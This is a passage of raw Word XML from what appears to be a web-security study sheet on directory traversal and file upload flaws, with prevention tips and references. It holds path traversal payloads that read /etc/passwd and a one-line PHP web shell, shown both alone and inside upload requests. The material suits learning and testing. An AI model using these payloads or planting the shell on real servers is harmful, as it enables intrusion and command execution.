            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">Generate CSRF </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>PoC</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> (pro)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidRPr="00C90528">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://portswigger.net/web-security/csrf</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="003F20FB" w:rsidRDefault="003F20FB" w:rsidP="003F20FB">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F20FB" w:rsidRDefault="003F20FB" w:rsidP="003F20FB">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F20FB" w:rsidRDefault="003F20FB" w:rsidP="003F20FB">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Directory </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>traversal :</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>_file_folder</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Gain access to files and directories that are stored outside the web root directory.  This can be accomplished in a variety of ways for requests that take user supplied input and use it to retrieve a file:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodesh"/>
      </w:pPr>
      <w:r>
        <w:t># Relative path traversal</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>https://server.com/loadimage?filename=../../../etc/passwd</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Absolute path traversal</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>https://server.com/loadimage?filename=/etc/passwd</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Known start path with relative traversal</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>https://server.com/loadimage?filename=/var/www/ima</w:t>
      </w:r>
      <w:r>
        <w:t>ges/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>/../../etc/passwd</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Relative path traversal with null byte</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>https://server.com/loadimage?filename=../../../etc/passwd%00.png</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Relative path traversal with escaped paths</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>https://server.com/loadimage?filename=....//....//....//etc/passwd</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>https://serv</w:t>
      </w:r>
      <w:r>
        <w:t>er.com/loadimage?filename=..../..../..../etc/passwd</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Relative path traversal with URL encoded paths %2E%2E%2F == ../</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>https://server.com/loadimage?filename=%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Do not allow user supplied input to be used to </w:t>
      </w:r>
      <w:r>
        <w:t>retrieve files.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Strip all path traversal characters from user supplied input.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Do not allow server process to read files outside of defined asset directories.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Change file retrieval requests against </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>safelist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> of allowed paths and files.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId9" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Burp Proxy</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId10" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Burp Repeater</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId11" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>BAp</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>p</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> Store &gt; </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Hackvertor</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/file-path-traversal</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">File upload </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>vulnerabilities :</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>page</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>_with_curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Vulnerabilities caused by accepting file uploads without sufficiently validating the file's content, size, or type.  In so</w:t>
      </w:r>
      <w:r>
        <w:t>me cases the upload itself is the attack, other times the attacker will request the file they've upload to trigger the attack.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">There are several types of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>attackes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Content not validated</w:t>
      </w:r>
      <w:r>
        <w:t>: allow an attacker to execute arbitrary script or code on the server.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>File name/location not validated</w:t>
      </w:r>
      <w:r>
        <w:t>: allow an attacker to overwrite existing files or upload files to a location they should not have access to.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Size not validated</w:t>
      </w:r>
      <w:r>
        <w:t>: use file upload to consume memory and disk space (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>How web servers handle file requests</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:t>eb servers typically handle responses for resources as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Non-executable files</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: the file is served back to the user (e.g. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>png</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Executable file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: the file is processed by the web server and the result is sent back to the user (e.g. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>jsp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>cutable file but server not configured to execute</w:t>
      </w:r>
      <w:r>
        <w:t>: this will either trigger an error or send the content of the file back to the user, which can result in source code leakage.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">:bulb: use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Content-Type</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> header's MIME type to determine what type of file th</w:t>
      </w:r>
      <w:r>
        <w:t>e server thinks it has sent you.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Attacks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Deploying a web shell</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>A web shell is when an attacker can upload a file that allows them to execute any command on a web server:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodephp"/>
      </w:pPr>
      <w:r>
        <w:t># execute arbitrary commands</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># GET /example/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>exploit.php?command</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=echo%20%2Fetc%2Fpasswd</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HTTP/1.1</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> echo system($_GET['command']); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Exploit file upload validation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Flawed file type validation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Uploads using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>multipart/form-data</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will send a request like the following:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodehttp"/>
      </w:pPr>
      <w:r>
        <w:t>POST /images HTTP/1.1</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r>
        <w:br/>
        <w:t>Host: normal-website.com</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Content-Length: 12345</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>---------------------------012345678901234567890123456</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Content-Disposition: form-data; name="image"; filename="example.jpg"</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Content-Type: image/jpeg</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>[...bi</w:t>
      </w:r>
      <w:r>
        <w:t>nary content of example.jpg...]</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>---------------------------012345678901234567890123456</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Content-Disposition: form-data; name="description"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Some image description right here</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>---------------------------012345678901234567890123456--</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>If the server trusts the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Content-Type: image/jpeg</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> value in the request and performs no further validation, it easy to upload a malicious file.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Bypass strict execution control in user-controlled directories</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Server will usually be configured to prevent execution of any files in use</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">r upload directories.  It may be possible to cause the file to be uploaded to a new, unexpected location by altering the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>filename</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> parameter in the upload request:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodehttp"/>
      </w:pPr>
      <w:r>
        <w:t>POST /images HTTP/1.1</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Host: normal-website.com</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Content-Length: 12345</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Content-Type: multipart/</w:t>
      </w:r>
      <w:r>
        <w:t>form-data; boundary=---------------------------012345678901234567890123456</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>---------------------------012345678901234567890123456</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Content-Disposition: form-data; name="image"; filename="</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>/../</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>exploit.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Content-Type: image/jpeg</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> echo system($_GET[</w:t>
      </w:r>
      <w:r>
        <w:t>'command']); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Insufficient block of malicious </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>filetypes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Servers may be configured to prevent execution of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> files, but may not block lesser known dynamic file types like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>.php5</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>shtml</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Overriding server configuration</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>It may be possible to upload a f</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ile that changes the configuration for a given directory, thereby allowing execution of the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>malcious</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodesh"/>
      </w:pPr>
      <w:r>
        <w:t># .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>htaccess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> granting execution of .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> files in an a user controlled upload directory</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>LoadModule</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
